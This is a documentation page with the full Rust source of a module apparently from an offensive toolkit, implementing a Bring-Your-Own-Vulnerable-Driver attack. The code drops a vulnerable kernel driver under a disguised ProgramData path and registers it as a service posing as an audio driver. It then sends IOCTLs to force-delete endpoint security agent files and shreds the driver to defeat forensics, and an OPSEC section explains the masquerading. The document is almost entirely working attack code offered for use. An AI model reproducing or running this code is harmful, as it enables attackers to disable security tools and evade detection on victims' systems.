# crowd -- byovd.rs  (S TIER -- kernel driver load via SCM for EDR file deletion)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/byovd.rs` |
| **Lines** | 446 |
| **Tier** | S |
| **Cards** | T018-byovd |
| **Role** | BYOVD pipeline |
| **Unsafe blocks** | 7 |

## Purpose

# crowd -- byovd.rs  (S TIER -- kernel driver load via SCM for EDR file deletion)

## BYOVD (Bring Your Own Vulnerable Driver) -- EDR file evasion

Ports the experimental `crates/core/src/experimental/evasion/byovd/` pipeline
into crowd's winapi-based infrastructure. Uses direct Win32 SCM APIs instead
of the `windows_service` crate used in the original.

### Pipeline
1. Drop a vulnerable driver (IMFForceDelete.sys) to a legit-looking path
under `ProgramData\Microsoft\Windows\DeviceMetadataStore\`.
2. Register the driver as a kernel-mode service via the Service Control
Manager (OpenSCManagerW, CreateServiceW, StartServiceW).
3. Open the device handle (`\\.\IMFForceDelete123`) for IOCTL access.
4. Issue DeviceIoControl calls to force-delete EDR-protected files.
5. Cleanup: stop service, delete service registration, shred driver file
(3-pass overwrite: zeros, 0xFF, sequential pattern, then unlink).

### OPSEC
- Driver path mimics a Windows device metadata cache file
- Service name and display name mimic a legitimate audio driver service
- On-demand start type (no persistence in boot sequence)
- 3-pass shred of the driver binary after use
- All handles closed promptly; service registration removed

### Cargo.toml note
The crowd Cargo.toml needs the `"winsvc"` feature added to the `[dependencies.winapi]`
features list for SCM functions (OpenSCManagerW, CreateServiceW, etc.).
Also needs `"ioapiset"` if not already transitively available.

## Constants

- `IOCTL_FORCE_DELETE`: `u32` = `0x8016_E000`
- `SERVICE_NAME`: `&str` = `"AudioRvxService"`
- `SERVICE_DISPLAY_NAME`: `&str` = `"Audio Rendering Service"`
- `DEVICE_PATH`: `&str` = `r"\\.\IMFForceDelete123"`
- `DRIVER_FILENAME`: `&str` = `"audrv.sys"`
- `SHRED_PASSES`: `usize` = `3`
- `ERROR_SERVICE_ALREADY_RUNNING`: `u32` = `1056`
- `ERROR_SERVICE_MARKED_FOR_DELETE`: `u32` = `1072`

## Public API

### `force_delete` (line 237)
```rust
pub fn force_delete(h_driver: HANDLE, target_path: &str) -> Result<()>
```
Send an IOCTL to the loaded vulnerable driver instructing it to force-delete
the file at `target_path`. The path is prefixed with `\\??\` as required by
the driver's kernel-mode file access routines.

Returns `Ok(())` on success. Returns an error if the IOCTL itself fails;
callers that iterate over multiple targets should handle errors gracefully.

### `run_byovd` (line 397)
```rust
pub fn run_byovd(driver_bytes: &[u8], targets: &[&str]) -> Result<()>
```
Execute the full BYOVD pipeline:

1. Drop the vulnerable driver to a legit-looking path on disk.
2. Register and start it as a kernel-mode service via the SCM.
3. Open the device handle for IOCTL communication.
4. Force-delete each target path through the driver.
5. Close the device handle.
6. Stop the service and delete its SCM registration.
7. Shred the driver file on disk (3-pass overwrite + unlink).

Cleanup (steps 5-7) is always attempted, even if the deletion loop in
step 4 encounters errors. The first target deletion error is propagated
after cleanup completes.

# Arguments
* `driver_bytes` -- Raw bytes of the vulnerable `.sys` driver (e.g.
`include_bytes!("path/to/IMFForceDelete.sys")`).
* `targets` -- Slice of filesystem paths to force-delete (standard
Win32 paths like `C:\Program Files\EDR\agent.exe`).

# Errors
Returns the first error encountered during the deletion phase, or any
critical error during setup (driver drop, service creation, device open).
Cleanup errors are silently swallowed to ensure maximum artifact removal.

## Internal Functions

- `to_wide_null` (line 79)
- `drop_driver` — Write `driver_bytes` to a path that mimics a legitimate Windows metadata (line 92)
- `register_and_start_service` — Register the driver at `driver_path` as a kernel-mode service and start it. (line 125)
- `open_device` — Open a read/write handle to the driver's device symbolic link. (line 199)
- `close_device` — Close a previously opened device handle. (line 223)
- `stop_and_delete_service` — Stop the kernel driver service and remove its registration from the SCM. (line 279)
- `shred_driver_file` — Securely erase the driver file with a 3-pass overwrite, then unlink it. (line 336)

## Key Dependencies

- `use anyhow::{anyhow, bail, Context, Result};`
- `use winapi::um::errhandlingapi::GetLastError;`
- `use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};`
- `use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};`
- `use winapi::um::ioapiset::DeviceIoControl;`
- `use winapi::um::winnt::{`
- `use winapi::um::winsvc::{`

## Full Source

```rust
//! # crowd -- byovd.rs  (S TIER -- kernel driver load via SCM for EDR file deletion)
//!
//! ## BYOVD (Bring Your Own Vulnerable Driver) -- EDR file evasion
//!
//! Ports the experimental `crates/core/src/experimental/evasion/byovd/` pipeline
//! into crowd's winapi-based infrastructure. Uses direct Win32 SCM APIs instead
//! of the `windows_service` crate used in the original.
//!
//! ### Pipeline
//! 1. Drop a vulnerable driver (IMFForceDelete.sys) to a legit-looking path
//!    under `ProgramData\Microsoft\Windows\DeviceMetadataStore\`.
//! 2. Register the driver as a kernel-mode service via the Service Control
//!    Manager (OpenSCManagerW, CreateServiceW, StartServiceW).
//! 3. Open the device handle (`\\.\IMFForceDelete123`) for IOCTL access.
//! 4. Issue DeviceIoControl calls to force-delete EDR-protected files.
//! 5. Cleanup: stop service, delete service registration, shred driver file
//!    (3-pass overwrite: zeros, 0xFF, sequential pattern, then unlink).
//!
//! ### OPSEC
//! - Driver path mimics a Windows device metadata cache file
//! - Service name and display name mimic a legitimate audio driver service
//! - On-demand start type (no persistence in boot sequence)
//! - 3-pass shred of the driver binary after use
//! - All handles closed promptly; service registration removed
//!
//! ### Cargo.toml note
//! The crowd Cargo.toml needs the `"winsvc"` feature added to the `[dependencies.winapi]`
//! features list for SCM functions (OpenSCManagerW, CreateServiceW, etc.).
//! Also needs `"ioapiset"` if not already transitively available.

#![allow(dead_code)]

use anyhow::{anyhow, bail, Context, Result};
use std::ffi::OsStr;
use std::io::Write;
use std::os::windows::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use std::ptr;

use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::ioapiset::DeviceIoControl;
use winapi::um::winnt::{
    GENERIC_READ, GENERIC_WRITE, HANDLE,
    SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
    DELETE as SERVICE_DELETE_ACCESS,
};
use winapi::um::winsvc::{
    CloseServiceHandle, ControlService, CreateServiceW, DeleteService,
    OpenSCManagerW, OpenServiceW, StartServiceW,
    SC_HANDLE, SC_MANAGER_ALL_ACCESS, SC_MANAGER_CONNECT,
    SERVICE_ALL_ACCESS, SERVICE_CONTROL_STOP, SERVICE_START, SERVICE_STOP,
    SERVICE_QUERY_STATUS, SERVICE_STATUS,
};

// -- Constants ----------------------------------------------------------------

/// IOCTL code for the IMFForceDelete driver's forced file deletion.
const IOCTL_FORCE_DELETE: u32 = 0x8016_E000;

/// Service name registered in the SCM (mimics a legitimate audio driver).
const SERVICE_NAME: &str = "AudioRvxService";

/// Display name shown in services.msc.
const SERVICE_DISPLAY_NAME: &str = "Audio Rendering Service";

/// Device symbolic link exposed by the IMFForceDelete driver.
const DEVICE_PATH: &str = r"\\.\IMFForceDelete123";

/// Driver filename on disk (benign-looking name with .sys extension).
const DRIVER_FILENAME: &str = "audrv.sys";

/// Number of shred passes before unlinking the driver file.
const SHRED_PASSES: usize = 3;

// -- Helper: encode a Rust string to a null-terminated wide (UTF-16LE) Vec ---

fn to_wide_null(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0u16))
        .collect()
}

// -- 1. Drop driver to disk ---------------------------------------------------

/// Write `driver_bytes` to a path that mimics a legitimate Windows metadata
/// cache entry. Creates intermediate directories if they do not exist.
///
/// Returns the full path to the dropped `.sys` file.
fn drop_driver(driver_bytes: &[u8]) -> Result<PathBuf> {
    let base = std::env::var("ProgramData")
        .unwrap_or_else(|_| r"C:\ProgramData".to_string());

    let driver_path = PathBuf::from(base)
        .join("Microsoft")
        .join("Windows")
        .join("DeviceMetadataStore")
        .join(DRIVER_FILENAME);

    // Only write if the file is not already present (idempotent re-runs).
    if !driver_path.exists() {
        if let Some(parent) = driver_path.parent() {
            std::fs::create_dir_all(parent)
                .context("Failed to create driver drop directory")?;
        }
        let mut file = std::fs::File::create(&driver_path)
            .context("Failed to create driver file on disk")?;
        file.write_all(driver_bytes)
            .context("Failed to write driver bytes")?;
        file.flush()
            .context("Failed to flush driver file")?;
    }

    Ok(driver_path)
}

// -- 2. SCM service registration and start ------------------------------------

/// Register the driver at `driver_path` as a kernel-mode service and start it.
///
/// If the service already exists (e.g. from a previous interrupted run), it is
/// opened and started without attempting to re-create it.
fn register_and_start_service(driver_path: &Path) -> Result<()> {
    let svc_name_w = to_wide_null(SERVICE_NAME);
    let display_w  = to_wide_null(SERVICE_DISPLAY_NAME);

    let driver_path_str = driver_path
        .to_str()
        .ok_or_else(|| anyhow!("Driver path is not valid UTF-8"))?;
    let binary_w = to_wide_null(driver_path_str);

    unsafe {
        // Open the local SCM with full access (required for CreateService).
        let h_scm = OpenSCManagerW(
            ptr::null(),           // local machine
            ptr::null(),           // SERVICES_ACTIVE_DATABASE
            SC_MANAGER_ALL_ACCESS,
        );
        if h_scm.is_null() {
            let err = GetLastError();
            bail!("OpenSCManagerW failed: 0x{:08X}", err);
        }

        // Try to open existing service first (idempotent).
        let h_svc = OpenServiceW(h_scm, svc_name_w.as_ptr(), SERVICE_START);

        let h_svc = if h_svc.is_null() {
            // Service does not exist yet -- create it.
            let h_new = CreateServiceW(
                h_scm,
                svc_name_w.as_ptr(),
                display_w.as_ptr(),
                SERVICE_START,                   // desired access
                SERVICE_KERNEL_DRIVER,           // service type
                SERVICE_DEMAND_START,            // start type (on-demand, not auto)
                SERVICE_ERROR_NORMAL,            // error control
                binary_w.as_ptr(),               // path to .sys
                ptr::null(),                     // no load ordering group
                ptr::null_mut(),                 // no tag id
                ptr::null(),                     // no dependencies
                ptr::null(),                     // LocalSystem account
                ptr::null(),                     // no password
            );
            if h_new.is_null() {
                let err = GetLastError();
                CloseServiceHandle(h_scm);
                bail!("CreateServiceW failed: 0x{:08X}", err);
            }
            h_new
        } else {
            h_svc
        };

        // Start the service (loads the driver into the kernel).
        let started = StartServiceW(h_svc, 0, ptr::null_mut());
        if started == 0 {
            let err = GetLastError();
            // ERROR_SERVICE_ALREADY_RUNNING (0x420 / 1056) is not a real error.
            const ERROR_SERVICE_ALREADY_RUNNING: u32 = 1056;
            if err != ERROR_SERVICE_ALREADY_RUNNING {
                CloseServiceHandle(h_svc);
                CloseServiceHandle(h_scm);
                bail!("StartServiceW failed: 0x{:08X}", err);
            }
        }

        CloseServiceHandle(h_svc);
        CloseServiceHandle(h_scm);
    }

    Ok(())
}

// -- 3. Open device handle ----------------------------------------------------

/// Open a read/write handle to the driver's device symbolic link.
fn open_device() -> Result<HANDLE> {
    let device_w = to_wide_null(DEVICE_PATH);

    let handle = unsafe {
        CreateFileW(
            device_w.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0,                // no sharing
            ptr::null_mut(),  // default security
            OPEN_EXISTING,
            0,                // no flags/attributes
            ptr::null_mut(),  // no template
        )
    };

    if handle == INVALID_HANDLE_VALUE {
        let err = unsafe { GetLastError() };
        bail!("Failed to open device {}: 0x{:08X}", DEVICE_PATH, err);
    }

    Ok(handle)
}

/// Close a previously opened device handle.
fn close_device(h_driver: HANDLE) {
    if !h_driver.is_null() && h_driver != INVALID_HANDLE_VALUE {
        unsafe { CloseHandle(h_driver); }
    }
}

// -- 4. Force-delete a file via the vulnerable driver -------------------------

/// Send an IOCTL to the loaded vulnerable driver instructing it to force-delete
/// the file at `target_path`. The path is prefixed with `\\??\` as required by
/// the driver's kernel-mode file access routines.
///
/// Returns `Ok(())` on success. Returns an error if the IOCTL itself fails;
/// callers that iterate over multiple targets should handle errors gracefully.
pub fn force_delete(h_driver: HANDLE, target_path: &str) -> Result<()> {
    // The driver expects an NT-style path: \\??\C:\path\to\file
    let nt_path = format!(r"\\??\{}", target_path);
    let mut wide_path: Vec<u16> = OsStr::new(&nt_path)
        .encode_wide()
        .chain(std::iter::once(0u16))
        .collect();

    let input_size = (wide_path.len() * std::mem::size_of::<u16>()) as u32;
    let mut bytes_returned: u32 = 0;

    let ok = unsafe {
        DeviceIoControl(
            h_driver,
            IOCTL_FORCE_DELETE,
            wide_path.as_mut_ptr() as *mut _,
            input_size,
            ptr::null_mut(), // no output buffer
            0,
            &mut bytes_returned,
            ptr::null_mut(), // not overlapped
        )
    };

    if ok == 0 {
        let err = unsafe { GetLastError() };
        bail!(
            "DeviceIoControl(IOCTL_FORCE_DELETE) failed for '{}': 0x{:08X}",
            target_path,
            err
        );
    }

    Ok(())
}

// -- 5. Cleanup: stop service, delete service, shred driver file --------------

/// Stop the kernel driver service and remove its registration from the SCM.
///
/// This is best-effort: errors are returned but callers may choose to ignore
/// them (e.g. if the service was already stopped or removed).
fn stop_and_delete_service() -> Result<()> {
    let svc_name_w = to_wide_null(SERVICE_NAME);

    unsafe {
        let h_scm = OpenSCManagerW(
            ptr::null(),
            ptr::null(),
            SC_MANAGER_CONNECT,
        );
        if h_scm.is_null() {
            let err = GetLastError();
            bail!("OpenSCManagerW (cleanup) failed: 0x{:08X}", err);
        }

        let desired = SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_DELETE_ACCESS as u32;
        let h_svc = OpenServiceW(h_scm, svc_name_w.as_ptr(), desired);
        if h_svc.is_null() {
            // Service doesn't exist -- nothing to clean up.
            CloseServiceHandle(h_scm);
            return Ok(());
        }

        // Stop the service (unloads the driver from kernel memory).
        let mut status: SERVICE_STATUS = std::mem::zeroed();
        let _ = ControlService(h_svc, SERVICE_CONTROL_STOP, &mut status);

        // Delete the service registration.
        let deleted = DeleteService(h_svc);
        let result = if deleted == 0 {
            let err = GetLastError();
            // ERROR_SERVICE_MARKED_FOR_DELETE (1072) is acceptable -- it will
            // be fully removed once all handles are closed.
            const ERROR_SERVICE_MARKED_FOR_DELETE: u32 = 1072;
            if err == ERROR_SERVICE_MARKED_FOR_DELETE {
                Ok(())
            } else {
                Err(anyhow!("DeleteService failed: 0x{:08X}", err))
            }
        } else {
            Ok(())
        };

        CloseServiceHandle(h_svc);
        CloseServiceHandle(h_scm);

        result
    }
}

/// Securely erase the driver file with a 3-pass overwrite, then unlink it.
///
/// Pass 1: all zeros (0x00)
/// Pass 2: all ones  (0xFF)
/// Pass 3: sequential byte pattern (i % 256)
///
/// This is defence-in-depth against forensic recovery; it does not guarantee
/// irrecoverability on SSDs with wear-leveling, but it raises the bar.
fn shred_driver_file(path: &Path) -> Result<()> {
    if !path.exists() {
        return Ok(());
    }

    let metadata = std::fs::metadata(path)
        .context("Failed to read driver file metadata for shredding")?;
    let size = metadata.len() as usize;

    if size > 0 {
        // Pass 1: zeros
        let zeros = vec![0x00u8; size];
        std::fs::write(path, &zeros)
            .context("Shred pass 1 (zeros) failed")?;

        // Pass 2: 0xFF
        let ones = vec![0xFFu8; size];
        std::fs::write(path, &ones)
            .context("Shred pass 2 (0xFF) failed")?;

        // Pass 3: sequential pattern
        let mut pattern = Vec::with_capacity(size);
        for i in 0..size {
            pattern.push((i % 256) as u8);
        }
        std::fs::write(path, &pattern)
            .context("Shred pass 3 (pattern) failed")?;
    }

    std::fs::remove_file(path)
        .context("Failed to unlink driver file after shredding")?;

    Ok(())
}

// -- Top-level orchestrator ---------------------------------------------------

/// Execute the full BYOVD pipeline:
///
/// 1. Drop the vulnerable driver to a legit-looking path on disk.
/// 2. Register and start it as a kernel-mode service via the SCM.
/// 3. Open the device handle for IOCTL communication.
/// 4. Force-delete each target path through the driver.
/// 5. Close the device handle.
/// 6. Stop the service and delete its SCM registration.
/// 7. Shred the driver file on disk (3-pass overwrite + unlink).
///
/// Cleanup (steps 5-7) is always attempted, even if the deletion loop in
/// step 4 encounters errors. The first target deletion error is propagated
/// after cleanup completes.
///
/// # Arguments
/// * `driver_bytes` -- Raw bytes of the vulnerable `.sys` driver (e.g.
///   `include_bytes!("path/to/IMFForceDelete.sys")`).
/// * `targets` -- Slice of filesystem paths to force-delete (standard
///   Win32 paths like `C:\Program Files\EDR\agent.exe`).
///
/// # Errors
/// Returns the first error encountered during the deletion phase, or any
/// critical error during setup (driver drop, service creation, device open).
/// Cleanup errors are silently swallowed to ensure maximum artifact removal.
pub fn run_byovd(driver_bytes: &[u8], targets: &[&str]) -> Result<()> {
    if driver_bytes.is_empty() {
        bail!("Driver bytes are empty -- nothing to load");
    }

    // Phase 1: Drop driver to disk
    let driver_path = drop_driver(driver_bytes)
        .context("BYOVD phase 1 (drop driver) failed")?;

    // Phase 2: Register and start the kernel service
    let svc_result = register_and_start_service(&driver_path);
    if let Err(e) = svc_result {
        // Cleanup the dropped file before propagating
        let _ = shred_driver_file(&driver_path);
        return Err(e.context("BYOVD phase 2 (register service) failed"));
    }

    // Phase 3: Open device handle
    let h_driver = match open_device() {
        Ok(h) => h,
        Err(e) => {
            // Cleanup: stop service + shred file
            let _ = stop_and_delete_service();
            let _ = shred_driver_file(&driver_path);
            return Err(e.context("BYOVD phase 3 (open device) failed"));
        }
    };

    // Phase 4: Force-delete each target
    let mut first_error: Option<anyhow::Error> = None;
    for target in targets {
        if let Err(e) = force_delete(h_driver, target) {
            if first_error.is_none() {
                first_error = Some(e);
            }
            // Continue trying remaining targets even if one fails
        }
    }

    // Phase 5-7: Cleanup (always runs)
    close_device(h_driver);
    let _ = stop_and_delete_service();
    let _ = shred_driver_file(&driver_path);

    // Propagate the first deletion error, if any
    match first_error {
        Some(e) => Err(e.context("BYOVD phase 4 (force delete) had failures")),
        None => Ok(()),
    }
}

```